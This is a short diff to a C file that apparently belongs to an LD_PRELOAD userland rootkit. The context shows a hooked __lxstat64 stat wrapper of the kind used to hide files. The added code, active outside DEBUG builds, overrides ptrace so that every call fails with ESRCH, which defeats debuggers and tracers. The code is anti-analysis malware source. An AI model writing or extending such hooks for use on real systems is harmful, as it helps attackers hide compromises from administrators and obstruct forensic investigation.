@@ -498,3 +498,11 @@ int __lxstat64(int version, const char *path, struct stat64 *buf)
     }
     return hooked_lxstat64(version, path, buf);
 } 
+
+#ifndef DEBUG
+long ptrace(enum __ptrace_request request, ...){
+    printf("[-] hooking ptrace\n");
+    errno = ESRCH;
+    return -1;
+}
+#endif
